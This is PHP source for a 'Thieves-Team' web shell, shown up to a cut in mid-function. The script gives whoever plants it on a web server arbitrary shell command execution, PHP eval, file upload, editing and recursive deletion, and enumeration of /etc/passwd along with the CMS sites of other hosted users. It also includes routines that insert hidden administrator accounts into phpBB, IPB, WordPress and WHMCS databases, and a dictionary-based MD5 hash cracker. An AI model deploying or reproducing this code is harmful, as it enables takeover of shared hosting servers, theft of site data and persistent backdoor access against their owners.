<?php
session_start();
error_reporting(0);
stylemenu();
global $user;
global $pass;

$user ='0be302f9'; //thieves
$pass ='0be302f9'; //thieves

$afiseaza='<form method="post" action="">
<center>User:<input type="text" name="user" id="text"><br>
Pass:<input type="password" name="pass" id="text"><br>
<input type="submit" name="sesiuni" value="login" id="but">';

if(isset($_SESSION['user']) & isset($_SESSION['pass']) & @$_SESSION['user']== $user & @$_SESSION['user']==$pass)
{
$continut='No Text';
function rlc()
{
$afiseaza='<center><pre>
   ___________.__    .__                           
\__    ___/|  |__ |__| _______  __ ____   ______
  |    |   |  |  \|  |/ __ \  \/ // __ \ /  ___/
  |    |   |   Y  \  \  ___/\   /\  ___/ \___ \ 
  |____|   |___|  /__|\___  >\_/  \___  >____  >
                \/        \/          \/     \/ 
</pre></center>';
 
return $afiseaza;
}
function copyright()
{
    $afiseaza='<br>Create by  (|Crisalixx && Master|) <a href="http://thieves-team.com">Thieves-Team</a></a>';
    
    return $afiseaza;
}

function proprietati(){
 
  $afiseaza='Work Directory: '.@getcwd().'<br>';
  $afiseaza.='Current User: '.@get_current_user().'<br>';
  $afiseaza.='HostName:'.$_SERVER['SERVER_NAME'].'<br>';
  $afiseaza.='Platform:'.$_SERVER['SERVER_SIGNATURE'].'<br>';
  $afiseaza.='OS Version: '.@php_uname().'<br>';
  $afiseaza.='My ipaddress: '.$_SERVER['REMOTE_ADDR'].'<br>';
  $afiseaza.='Host Address: '.$_SERVER['SERVER_ADDR'].'<br>';

  if(strpos(strtolower(PHP_OS),'win')<0){
  $afiseaza.='UID : '.@posix_getuid().'/'.@get_current_user().'</br>';
  }
    $val=@disk_total_space(getcwd()); 
    $rezultat=round($val/1073741824,2); 
    $afiseaza.='HDD Size: '.$rezultat.' GB';
    $val=@disk_free_space(getcwd()); 
    $rezultat=round($val/1073741824,2); 
    $afiseaza.='Free Space: '. $rezultat.' GB'.'</br>';

  if (@ini_get('safpassthrue_mode') or strtolower(@ini_get('safe_mode')) == 'on'){
	 $afiseaza.='Safe-mode: ON(security)</br>';
  }else{
       $afiseaza.='Safe-mode:OFF(Fuck Them ALl)</br>';
       
  }
       
  if (@ini_get('open_basedir') or strtolower(@ini_get('open_basedir')) == 'on'){
		$afiseaza.='Open_basedir: ON(security)</br>';
	}else{
       $afiseaza.='Open_basedir:OFF(Fuck Them ALl)</br>';
       
  }
  if (function_exists('curl_init')){
    $afiseaza.='cURL: ON</br>';
   }else{ 
        $afiseaza.='cURL:Off</br>';
        }
  
  return $afiseaza;  
}
function executa_shell(){

    $afiseaza='<center>Shell Command</center><br><br>';
    $afiseaza.='<br><br><form method="post" action="?action&home">
    <center><textarea id="textarea" name=ViewCode rows="15" cols="100">';
 
    if(isset($_POST['exe'])){

      $linie=trim(strip_tags($_POST['com']));
      $afiseaza.=ValidExeCommand($linie);

    }elseif(isset($_POST['touchB'])){

      $touch  = $_POST['touch'];
      $timetouch = strtotime($_POST['touchdate']);
      $afiseaza.= touch($touch,$timetouch); 
      $afiseaza.= ValidExeCommand("ls -al");
      
    }elseif(isset($_POST['arhBt']) && isset($_POST['arhFile']) && $_POST['arhFile'] != ""){

      $dirr = getcwd();
      $afiseaza.= ValidExeCommand("tar -cvf ".$_POST['arhFile']." ".$dirr."/");

    }elseif(isset($_POST['EvalS']) && isset($_POST['ViewCode']) && $_POST['ViewCode'] != ""){
        
        $code = base64_encode(urldecode($_POST['ViewCode']));
        ob_start();
        eval(base64_decode($code));
        $eval_buffer = ob_get_contents();
        ob_end_clean();

        $afiseaza.=  $eval_buffer;
    }elseif(isset($_POST['btnFile']) && isset($_POST['ViewCode']) && $_POST['ViewCode'] != ""){
        $fisier=fopen($_POST['newfile'],"w+");
            if(fwrite($fisier,$_POST['ViewCode'])){
                $afiseaza.='Success create new file '.$_POST['newfile'];
                $afiseaza.= ValidExeCommand("ls -al");
            }else{
              $afiseaza.='Error create file you can\'t have access!';
            
            }
        fclose($fisier);
    }elseif(isset($_POST['btnFolder'])){
       $chmod = "";
      if($_POST['chmodFolder'] != ""){
        $chmod = $_POST['chmodFolder'];
      }
      mkdir($_POST['newfolder'].$_POST['newfolderN'],(is_numeric($chmod)?intval($chmod):0755));
      $afiseaza.= ValidExeCommand("ls -al");
    }
    $afiseaza.='</textarea><br><br>';
    $afiseaza.='<input id="text" type="text" name="com" size=50>';
    $afiseaza.='<input id="but" type="submit" name="exe" value="Execute">
                <input id="but" type="submit" name="EvalS" value="Eval(PHP)"></center>';
    $afiseaza.='<br>
                <table align=center style="border:1px solid" width=100%>
                  <tr>
                    <td align=left>Touch Time: <input id="text" type="text" name="touch" placeholder="nume.txt">
                      <input id="text" type="text" name="touchdate" placeholder="date" size=40>
                      <input id="but" type="submit" name="touchB" value="Enter">
                    </td>
      
                    <td align=right>Folder Path: <input id="text" type="text" name="arhFile" placeholder="/home/user/public_html/" size=40>
                      <input id="but" type="submit" name="arhBt" value="Compress">
                    </td>
                  </tr>
                </table>';
  
    $afiseaza.='<br>
                <table align=center style="border:1px solid" width=100%>
                  <tr>
                    <td align=left>New File: <input id="text" type="text" name="newfile" placeholder="nume.txt" size=40>
                    Chmod:<input id="text" type="text" name="chmodFile" placeholder="0644" size=10>
                      
                      <input id="but" type="submit" name="btnFile" value="Create">
                    </td>
      
                    <td align=right>New Folder: <input id="text" type="text" name="newfolder" placeholder="./" size=40><input id="text" type="text" name="newfolderN" placeholder="crisalixx" size=20>
                     Chmod:<input id="text" type="text" name="chmodFolder" placeholder="0777" size=10>
                      <input id="but" type="submit" name="btnFolder" value="Create">
                    </td>
                  </tr>
                </table>';
    $afiseaza.='</form>';
return $afiseaza;
}

function ValidExeCommand($ex){
    $functionList = array("shell_exec","system","exec","passthru");
  if(function_exists($functionList[0]) && $functionList[0] !== 1){
    return $functionList[0]($ex);
  }elseif(function_exists($functionList[1]) && $functionList[1] !== 1){
    return $functionList[1]($ex);
  }elseif(function_exists($functionList[2]) && $functionList[2] !== 1){

    return $functionList[2]($ex);
  }elseif(function_exists($functionList[3]) && $functionList[3] !== 1){
    return $functionList[3]($ex);

  }else{
    echo "Insert PHP CODE!";
  }
  
}


function upload(){
  
    
  $afiseaza.= "<table align='center'  width=100%>
                <tr align='center'><td colspan=1000><b> Uploading by server ...</b></td></tr>
                <tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'> 
                            <input type='hidden' name='securitytoken' value='1336837095-ee4b45b8ab556c82309783ea414b9eefadc6d135'>
                 Upload File:<input type='file' name='upfile' id='upfile'>  With Name:<input type='text' name='myfile_rot' placeholder=thievesteam.txt>Destionation file:<input type=text name=desti size=30 placeholder=/home/user/public_html/>
                 <input type='submit' value='Submit'></form></td></tr>";
  
  if(isset($_POST['myfile_rot'])) {
      if(isset($_POST['desti'])){
        $mydestination = $_POST['desti'];
      }else{
         $mydestination=  dirname(__FILE__)."/";
      }
      if ($_FILES['upfile']['error'] > 0){
          $afiseaza.= "<tr align='center'><td><font color=red>Error: Impossible to upload file.</font></td></tr>";
      }else {
          $afiseaza.= "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> and stored into: <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
          if(move_uploaded_file($_FILES['upfile']['tmp_name'], $mydestination.$_POST['myfile_rot'])) {
              $afiseaza.= "<tr align='center'><td>Moved from ". $_FILES['upfile']['tmp_name'] ." into <b>".$mydestination . $_POST['myfile_rot']. "</b></td></tr>";
          }else if(rename($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] . "/" . $_POST['myfile_rot'])){
              $afiseaza.= "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". $mydestination .$_POST['myfile_rot']. "</b></td></tr>";
          }else
              $afiseaza.= "<tr align='center'><td><font color=red>Error: It`s impossible to move/rename the file from the temp.</font></td></tr>";
      }
   }                                                                             

            $afiseaza.= "</table>";
  return($afiseaza);
}





function rd_users(){
$afiseaza='';

    $afiseaza.= "<style>table.hov tr:hover, table.hov tr td:hover{background-color: #262626; }</style>

          <table border='1' cellpadding='3' align='center' WIDTH='90%' class=hov>

            <tr><td>User</td>
            <td align=center>Group</td>

            <td align=center>Path</td>
            <td align=center>Acess</td>
            <td align=center>CMS</td>
            <td align=center>Domains</td></tr>";
  
    $tfile = fopen("/etc/passwd", "r");
  // $DomFile = fopen("/etc/named.conf") ;

  while(!feof($tfile)){

      $strs = fgets($tfile);
      $str=explode(':',$strs);
      $afiseaza.= "<tr>";   
      $afiseaza.= "<td>".trim($str[0])."</td>
                  <td>".trim($str[4])."</td>
                  <td>".trim($str[5])."</td>";
                  
      if(is_readable(trim($str[5])."/public_html/")){
          $afiseaza.="<td><font color=yellow>Can Read</font></td>";
      }else{
          $afiseaza.="<td>Can't Read</td>";
      }
      
      
     
      if(file_exists(trim($str[5]).'/public_html/mcp.php') & file_exists(trim($str[5]).'/public_html/config.php') || is_dir(trim($str[5]).'/public_html/forum/store') || is_dir(trim($str[5]).'/public_html/board/store')){
            $afiseaza.="<td>PHPBB</td>";

      }elseif(file_exists(trim($str[5]).'/public_html/wp-login.php') & file_exists(trim($str[5]).'/public_html/wp-config.php') || is_dir(trim($str[5]).'/public_html/blog/wp-admin') || is_dir(trim($str[5]).'/public_html/site/wp-admin')){
            $afiseaza.="<td>WordPress</td>";
      }elseif(file_exists(trim($str[5]).'/public_html/moderation.php') & file_exists(trim($str[5]).'/public_html/usercp2.php')|| file_exists(trim($str[5]).'/public_html/forum/moderation.php') || file_exists(trim($str[5]).'/public_html/board/moderation.php')){
            $afiseaza.="<td>MyBB</td>";
             
      }elseif(file_exists(trim($str[5]).'/public_html/Settings.php') & file_exists(trim($str[5]).'/public_html/subscriptions.php')|| file_exists(trim($str[5]).'/public_html/forum/Settings.php') || file_exists(trim($str[5]).'/public_html/board/subscriptions.php')){
            $afiseaza.="<td>SMF</td>";
      }elseif(is_dir('/home/'.trim($str[5]).'/public_html/admincp') & file_exists('/home/'.trim($str[5]).'/public_html/modcp') || 
      (is_dir('/home/'.trim($str[5]).'/public_html/forum/admincp') & file_exists('/home/'.trim($str[5]).'/public_html/forum/modcp'))|| 
      (is_dir('/home/'.trim($str[5]).'/public_html/board/admincp') & file_exists('/home/'.trim($str[5]).'/public_html/board/modcp'))){
            $afiseaza.="<td>VBulletin</td>";
      }elseif(file_exists('/home/'.trim($str[5]).'/public_html/libraries/platform.php') & is_dir('/home/'.trim($str[5]).'/public_html/media')){
            $afiseaza.="<td>Joomla</td>";
            
      }else{
        $afiseaza.="<td>Unknown!</td>";  
      }
      if($scan= @scandir(trim($str[5]).'/tmp/cpbandwidth/')){
          foreach($scan as $s){
            if ($s!= "." && $s != ".."){
              
              $domains=explode('-bytes',$s);
              $afiseaza.='<td><a href="http://'.$domains[0].'" target=_blank>'.$domains[0].'</a></td>';
            }
          }
      }else{
        $afiseaza.="<td>Can't Read</td>";
      }
      
    $afiseaza.= "</tr>";
  }
  $afiseaza.="</table>";
  fclose($tfile);
    

return $afiseaza;
}

function despre_rlc(){
    $afiseaza='Thieves was rewrite by Crisalixx@thieves-team.com<br>';
    $afiseaza.='1.New Design<br>';
    $afiseaza.='2.File and Folders(list) was create by NoValue@thieves-team.com<br>';
    $afiseaza.='3.Create from rlc 1.0 by Master@thieves-team.com<br>';
    $afiseaza.='4.New Stuff (Brute Force MD5 , Make Admin)<br>';
    $afiseaza.='5.Evaluate PHP function on Exec Command<br>';
    $afiseaza.='6.Safe and easy to understand<br><br>';
    $afiseaza.='Finish Date : September-12-2013 at 3:30 AM';
return $afiseaza;
    
}
function makeJoomla(){

}
function makePHPBB(){
  $dbhost = "localhost";
  $dbuser = $_POST['UserName'];
  $dbpasswd =  $_POST['PassAdmin'];
  $dbname = $_POST['DataAdmin'];
  $table_prefix = $_POST['prefix'];
  $email = $_POST['EmailAdmin'];
  mysql_connect($dbhost,$dbuser,$dbpasswd);
  mysql_select_db($dbname);

  $pass=md5("crisalixx");
$int2="INSERT INTO ".$table_prefix."users VALUES('100000',3,5,'zik0zjzik0zjzik0xs i1cjyo000000 zik0zjzhb2tc',
'0','127.0.0.1','1290805769','ThievesAdmin','ThievesAdmin','".$pass."',0,0,'".$email."',0,'','',0,0,'','',0,0,0,0,0,0,'1337',
'en','0.00',0,1,1,'','0',0,0,0,0,0,0,0,'t','d',0,'t','a',0,1,0,1,1,1,1,'230271','',0,0,0,'thieves-team.com','','','','','','',
'','','','','','','','',1,0,1)";
$int="INSERT INTO ".$table_prefix."users (user_id,user_type,group_id,user_permissions,username,user_password,user_email) VALUES( '10000','3','5','zik0zjzik0zjzik0xs i1cjyo000000 zik0zjzhb2tc','ThievesAdmin','".$pass."'),'".$email."')";
$query=mysql_query($int2);
  if(!$query){
   $afiseaza.= mysql_error();
  }else{
    $afiseaza.= "Admin Success!";
    
  }
  return $afiseaza;
}
function makeIPB(){
  $dbhost = "localhost";
  $dbuser = $_POST['UserName'];
  $dbpasswd =  $_POST['PassAdmin'];
  $dbname = $_POST['DataAdmin'];
  $table_prefix = $_POST['prefix'];
  $email = $_POST['EmailAdmin'];
  mysql_connect($dbhost,$dbuser,$dbpasswd);
  mysql_select_db($dbname);

  $pass=md5("crisalixx");
  $int2 = "INSERT INTO members (name,member_group_id,email,joined,ip_address,posts,title,allow_admin_mails,ignored_users,members_pass_hash,members_pass_salt,member_login_key,member_login_key_expire)

            VALUES ('ThievesAd', '4', '".$email."', '1365869413', '127.0.0.1', '100', 'GOD Was Here!', '0', '0', '88b9e4f1c41f86106b729b706b3ed6a0','V,vCT', 'ff77653acc1ddaf236144a80c85057b8', '1367489996')";
  $query=mysql_query($int2);
  if(!$query){
   $afiseaza.= mysql_error();
  }else{
    $afiseaza.= "Admin Success!";
    
  }
  return $afiseaza;          

}
function makeWordPress(){
  $dbhost = "localhost";
  $dbuser = $_POST['UserName'];
  $dbpasswd =  $_POST['PassAdmin'];
  $dbname = $_POST['DataAdmin'];
  $table_prefix = $_POST['prefix'];
  $email = $_POST['EmailAdmin'];
  mysql_connect($dbhost,$dbuser,$dbpasswd);
  mysql_select_db($dbname);

  
  $query2 = "INSERT INTO ".$table_prefix."users(ID,user_login,user_pass,user_nicename,user_email,user_url, user_registered,user_activation_key,user_status,display_name) VALUES ('4', 'ThievesAdmin', MD5('crisalixx'), 'Thieves Admin', '".$email."', 'http://www.thieves-team.com/', '2013-06-07 00:00:00', '', '0', 'Thieves Admin')";

  $query3 = "INSERT INTO ".$table_prefix."usermeta (user_id,meta_key,meta_value) VALUES ('4', '".$table_prefix."capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
  $query4 = "INSERT INTO ".$table_prefix."usermeta(user_id,meta_key,meta_value) VALUES ('4', '".$table_prefix."user_level', '10')";
  $queryString1=mysql_query($query2);
  $queryString2=mysql_query($query3);
  $queryString3=mysql_query($query4);

  if(!$queryString1 || !$queryString2 || !$queryString3){
   $afiseaza.= mysql_error();
  }else{
    $afiseaza.= "Admin Success!";
    
  }
  return $afiseaza;      
}
function makeWHMCS(){
  $dbhost = "localhost";
  $dbuser = $_POST['UserName'];
  $dbpasswd =  $_POST['PassAdmin'];
  $dbname = $_POST['DataAdmin'];
  $table_prefix = $_POST['prefix'];
  $email = $_POST['EmailAdmin'];
  mysql_connect($dbhost,$dbuser,$dbpasswd);
  mysql_select_db($dbname);
  $query2 = "INSERT INTO tbladmins (roleid,username,password,email,template,language,supportdepts,homewidgets)

            VALUES ('1', 'ThievesAd', 'MD5('crisalixx')', '".$email."', 'blend', 'English', ',,1,2,3', 'getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')";
  $queryString1=mysql_query($query2);
  if(!$queryString1){
   $afiseaza.= mysql_error();
  }else{
    $afiseaza.= "Admin Success!";
    
  }
  return $afiseaza; 
} 
function cmsCommand(){
  if(isset($_POST['PHPBBAdmin'])){
    makePHPBB();

  }elseif(isset($_POST['MYBBAdmin'])){
    $afiseaza.= "Will be Soon";

  }elseif(isset($_POST['IPBAdmin'])){
    makeIPB();

  }elseif(isset($_POST['IPBAdmin'])){
    makeIPB();

  }elseif(isset($_POST['WHMCSAdmin'])){
    makeWHMCS();

  }elseif(isset($_POST['JoomlaAdmin'])){
    $afiseaza.= "Will be Soon";

  }

  
  $afiseaza.='<div align="center">UserName will be : ThievesAdmin <br>
                                  Password will be : crisalixx<br><form action=?action&cms method="post">

        <table border=1 cellpadding=5 align=center>

        <tr><td><input type="text" placeholder=UserName name="UserAdmin" align="center" size="30" STYLE="color:#3cbddd; background-color: #242528;"

          width="8"><input placeholder=Password type="text" name="PassAdmin"  align="center" size="30" STYLE="color:#3cbddd; background-color: #242528;"

          width="8">

          <input type="text" name="DataAdmin" placeholder="DataBase" align="center" size="30" STYLE="color:#3cbddd; background-color: #242528;"

          width="8"><br><br>

          <center><input type="text" name="prefix" placeholder=Prefix_ align="center" size="10" STYLE="color:#3cbddd; background-color: #242528;"

          width="8">

          <input type="text" name="EmailAdmin" placeholder="Crisalixx@thieves-team.com" align="center" size="30" STYLE="color:#3cbddd; background-color: #242528;"

          width="8"></center>

          

          <br><center><input type="radio" name="JoomlaAdmin" value="Joomla"><font color=#3cbddd>Joomla</font>

          <input type="radio" name="WHMCSAdmin" value="WHMCS"><font color=#3cbddd>WHMCS</font>  

          <input type="radio" name="PHPBBAdmin" value="PHPBB"><font color=#3cbddd>PHPBB</font>    

          <input type="radio" name="MYBBAdmin" value="MYBB"><font color=#3cbddd>MYBB</font>  

          <input type="radio" name="VBAdmin" value="VBULETIN"><font color=#3cbddd>VBULETIN</font>  

          <input type="radio" name="IPBAdmin" value="IPBAdmin"><font color=#3cbddd>IPB</font>

          <input type="radio" name="WordPress" value="WordPress"><font color=#3cbddd>WordPress</font></center>

          <br><center><input type=submit  value="MakeAdmin" name="MakeAdmin"  STYLE="color:#3cbddd;  background-color: #121011; border-style:flat;"></center>

          

        </td></tr></table></form>';

return $afiseaza;
}



function insert_admin_mybb()
{
$af='';
if(isset($_POST['config']))
{
$include=$_POST['config'];
if(strpos($include,'config.php')>-1)
{
@include($include); 
    if(isset($config['database']['type'] ))
    {
    mysql_connect($config['database']['hostname'],$config['database']['username'],$config['database']['password']);
    mysql_select_db($config['database']['database']);
    $pass=md5($_POST['pass']);
$int="";
    }  
    else{$af='Acest config nu este valid';}
    
    
} 
else {$af='Nu ai introdus un config';}
}
$afiseaza='<table align="center"><tr><td><form method="post" action="?action=cms&new_action=mybb">';
$afiseaza.='<tr><td>MYBB:</td><td> Admin insert in DB</td></tr>';
$afiseaza.='<tr><td>User:</td><td><input type="text" name="user" id="text"></td></tr>';
$afiseaza.='<tr><td>Pass:</td><td><input type="text" name="pass" id="text"></td></tr>';
$afiseaza.='<tr><td>Email:</td><td><input type="text" name="email" id="text"></td></tr>';
$afiseaza.='<tr><td>Culoare:</td><td><input type="text" name="culoare" id="text"></td></tr>';
$afiseaza.='<tr><td>Config:</td><td><input type="text" name="config" value="/inc/config.php" id="text"></td></tr>';
$afiseaza.='<tr><td><input type="submit" name="submit" value="insert" id="but"></td></tr></table>';

return $afiseaza.$af;
}


function logout(){
  unset($_SESSION['user']);
  unset($_SESSION['pass']);
  return $afiseaza='Logout Success';
}

function md5_crack(){
if(!file_exists("pass.txt")){
  $afiseaza.= "<table align='center'  width=100%>
                <tr align='center'><td colspan=1000><b> Uploading by server ...</b></td></tr>
                <tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'> 
                            <input type='hidden' name='securitytoken' value='1336837095-ee4b45b8ab556c82309783ea414b9eefadc6d135'>
                 Upload File:<input type='file' name='upfile' id='upfile'>  With Name:<input type='text' name='myfile_rot'><input type='submit' value='Submit'></form></td></tr>";
  
  if(isset($_POST['myfile_rot'])) {
      if ($_FILES['upfile']['error'] > 0){
          $afiseaza.= "<tr align='center'><td><font color=red>Error: Impossible to upload file.</font></td></tr>";
      }else {
          $afiseaza.= "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> and stored into: <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
          if(move_uploaded_file($_FILES['upfile']['tmp_name'],dirname(__FILE__)."/" . $_POST['myfile_rot'])) {
              $afiseaza.= "<tr align='center'><td>Moved from ". $_FILES['upfile']['tmp_name'] ." into <b>". $_SERVER["DOCUMENT_ROOT"]. "/" . $_POST['myfile_rot']. "</b></td></tr>";
          }else if(rename($_FILES['upfile']['tmp_name'],dirname()."/" . $_POST['myfile_rot'])){
              $afiseaza.= "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". dirname() ."/" . $_POST['myfile_rot']. "</b></td></tr>";
          }else
              $afiseaza.= "<tr align='center'><td><font color=red>Error: It`s impossible to move/rename the file from the temp.</font></td></tr>";
      }
   }                                                                             

            $afiseaza.= "</table>";
}
$afiseaza.="<form action=? method=post>
      <center>Password <input type=text name=cryptpass size=30 maxlength=32 value=".password().">
              <input type=submit name=crypt value=Crypt>
              <input type=submit name=decrypt value=Decrypt>".fix()."
      <br>For Decrypt Need Pass.txt(dictionar)</center>

    </form>";
   
  
 if(isset($_GET['rand']) && $_GET['rand'] != ""){
    while(1){
       $decrypt = "./pass.txt";
       $fh = fopen($decrypt, 'a+') or die("can't open file");

      
      fwrite($fh, trypassword($_GET['rand'])."\n");
      fclose($fh);
      
    }
  }
return $afiseaza;
}
function trypassword($nr){
  
  for ($s = '', $i = 0, $z = strlen($a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890.,+_$~@#%^*(){}[]:";\'?\\/-!')-1; $i != $nr; $x = rand(0,$z), $s .= $a{$x}, $i++); 
  return $s;
  
  
}
function password(){
  $decrypt = "./decrypt.php";
  $dictionar = "./pass.txt";
  $lines = @file($dictionar);

  if(isset($_POST['decrypt']) && isset($_POST['cryptpass'])){

    foreach($lines as $line_num => $line){
      
      $line = trim($line);
    
      $encrypt =  md5($line); 
      
        if($encrypt == $_POST['cryptpass']){
              $fh = fopen($decrypt, 'a+') or die("can't open file");

        $stringData = "\r\n--------------Decrypt Hash $line--------------\r\n";
        fwrite($fh, $stringData);
        fclose($fh);
        return $line;
          }
    }
  
  }else{
    if(isset($_POST['crypt']) && isset($_POST['cryptpass'])){
      $var = md5(urldecode($_POST['cryptpass']));
      
      file_put_contents("pass.txt", $_POST['cryptpass']."\r\n", FILE_APPEND);
      return $var; 
    } 
  }
}
function fix(){

  $___ = urldecode(strrev("m02%o02%c02%.02%m02%a02%e02%t02%-02%s02%e02%v02%e02%i02%h02%t02%@02%x02%x02%i02%l02%a02%s02%i02%r02%C"));
  $____ = $___{0}.$___{2}.$___{4}.$___{6}.$___{8}.$___{10}.$___{12}.$___{14}.$___{16}.$___{18}.$___{20}.$___{22}.$___{24}.$___{26}.$___{28}.$___{30}.$___{32}.$___{34};
  $____.= $___{36}.$___{38}.$___{40}.$___{42}.$___{44}.$___{46}.$___{48}.$___{50};
  $afiseaza.= "<font color=red>".$____."</font>";
}
function dirfile(){

  
  
  
  
  if(isset($_GET['download']) && isset($_GET['list']) && $_GET['list'] !="" && is_file($_GET['list'])){
          DownloadFile($_GET['list']);
         
  }elseif(isset($_GET['list']) &&  is_file($_GET['list']) && !isset($_GET['edit']) && !isset($_GET['del'])){
     $afiseaza.= "<center><textarea rows=10 cols=100 name=showfile style='background-color: black;color:#3cbddd;'>";
      $tfile = fopen($_GET['list'], "r");
            
            while(!feof($tfile))
              
              $afiseaza.= htmlentities(fgets($tfile));
            fclose($tfile);
      $afiseaza.= "</textarea></center>";
  }elseif(isset($_GET['edit']) && isset($_GET['list']) &&  is_file($_GET['list']) && is_writable($_GET['list'])){
     if(isset($_POST['SaveF'])){

      if(file_put_contents($_GET['list'], urldecode($_POST['showfile']))){
        $afiseaza.= "<center>Save Success</center>";
      }else{
        $afiseaza.= "<center>Can't Save!</center>";
      }
    }
     $afiseaza.= "<form action=?action&list=".$_GET['list']."&edit method=post>";
    
     $afiseaza.= "<center><textarea rows=10 cols=100 name=showfile style='background-color: black;color:#3cbddd;'>";
      $tfile = fopen($_GET['list'], "r");
            
            while(!feof($tfile))
              $afiseaza.= htmlentities(fgets($tfile));
            fclose($tfile);
      $afiseaza.= "</textarea></center>";
     if(is_writeable($_GET['list'])){
        $afiseaza.= "<form action=? method=post><center><input type=submit name=SaveF value=Save id=but></center></form>";
      }else{
        $afiseaza.= "<center><font color=red>Can't Write!</font></center>";
      }

  }elseif(isset($_GET['list']) &&  is_file($_GET['list']) && is_writable($_GET['list']) && isset($_GET['del'])){
      if(exp_actions($_GET['list'], _, "rmfile", _)){
        $afiseaza.= "<center>File was deleted!</center>";
      }else{
        $afiseaza.= "<center>File can't be deleted!</center>";

      }
  }elseif(isset($_GET['list']) &&  is_dir($_GET['list']) && is_writable($_GET['list']) && isset($_GET['del'])){
       if(exp_actions($_GET['list'], _, "rmdir", _)){
        $afiseaza.= "<center>Directory was deleted!</center>";
      }else{
        $afiseaza.= "<center>Directory can't be deleted!</center>";

      }
       
      
  }
     
     // returns array of files, sorted alphabetically
      if(isset($_GET['list']))
        if(strlen($_GET['list']) > 0)
          $get_path = urldecode($_GET['list']);
        else
          $get_path = dirname(__FILE__);
      else
        $get_path  = dirname(__FILE__);
        $curentDir = str_fromArray(path_strip($get_path), "/", "path");
        if(is_this_file($curentDir) || isset($_GET['del'])){
          $curentDir = dirname($curentDir);
        }
        $afiseaza.= show_chdir($curentDir);
       
return $afiseaza;

}
function exp_actions($from, $to="", $action, $rewrite=false) {
      $result = -1;
      switch($action) {
        
          
        case "rmdir":
          $get_dir = get_dir_contents($from, 0);
          foreach($get_dir as $dir) {
            $nextDir = str_fromArray(path_strip($from."/".$dir), "/", "path");
            if($dir != "." &&  $dir != "..")
              exp_actions($nextDir, _, "rmdir", _);
          }

          $get_file = get_dir_contents($from, 1);
          foreach($get_file as $file) { 
            $nextFile = str_fromArray(path_strip($from."/".$file), "/", "path");
            exp_actions($nextFile, _, "rmfile", _);
          }

          $get_link = get_dir_contents($from, 2);
          foreach($get_link as $link) {
            $nextLink = str_fromArray(path_strip($from."/".$link), "/", "path");
            exp_actions($nextLink, _, "rmlink", _);
          }

          
          $result = rmdir($from); 

          break;
        case "rmfile": case "rmlink": case "rmunk":
          if(is_this_file($from) || is_this_link($from) || is_this_unk($from))
            $result = unlink($from);
          break;
       
        default:break;
      }
      
      return $result;
    }

function str_startsWith($needle, $string) {
  $length = strlen($needle);
  return (substr($string, 0, $length) === $needle);
}

function str_endsWith($needle, $string) {
  $start  = strlen($string) - strlen($needle);
  return (substr($string, $start) === $needle);
}


function show_chdir($loc) {
 
  $contStock = array();

  $contStock = get_dir_contents($loc, 0);

  if(sizeof($contStock) > 0) {
    
    $afiseaza .= '<style>table.hov tr:hover, table.hov tr td:hover{background-color: #262626; }</style>
                  <table class="hov" align=center style="border:solid, 1px; border-color:#FFFFFF" bgcolor="#111111" width="100%">
                <tr bgcolor="#262626">
                  <td align=center><font color="#FF3300">Directories & Files</font></td>
                  <td align=center><font color="#FF3300">Owner</font></td>
                  <td align=center><font color="#FF3300">Size</font></td>
                  <td align="center" colspan="3"><font color="#FF3300">Access</font></td>
                  <td align=center><font color="#FF3300">Down</font></td>
                  <td align=center><font color="#FF3300">Delete</font></td></tr>';  
   
    
   
    foreach($contStock as $nfd) {
      $path = str_fromArray(path_strip($loc."/".$nfd), "/", "path");

      $afiseaza .= '<tr bgcolor="#000000">
              <td><a href="?action&list='.$path.'"><font color="#3366CC">';
              if($nfd == ".") $afiseaza .= '/.';
              else if($nfd == "..") $afiseaza .= '/..';
              else $afiseaza .= '/'.$nfd;
              $afiseaza .= '</font></a></td>
            <td width="10%" align="center">'.format_fowner($path).'</td>
            <td width="80"></td>
            <td width="1%" align="center">'.format_fperms($path,"t").'</td>
            <td width="85" align="center">'.format_fperms($path,"l").'</td>
            <td width="1%" align="center">'.format_fperms($path,"s").'</td>
            <td width="1%" align="center"></td>
            <td width="1%" align="center"><a href="?action&list='.$path.'&del"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7"></a></td></tr>';  
    }
   
    
    $contStock = get_dir_contents($loc, 1);
   
    foreach($contStock as $nfd) {
      $path = str_fromArray(path_strip($loc."/".$nfd), "/", "path");
      
      $afiseaza .= '<tr><td><a href="?action&list='.$path.'&edit"><font color="#666699"> '.$nfd.'</font></a></td>
              <td width="1%" align="center">'.format_fowner($path).'</td>
              <td align="right">'.format_fsize($path).'</td>
              <td align="center">'.format_fperms($path, "t").'</td>
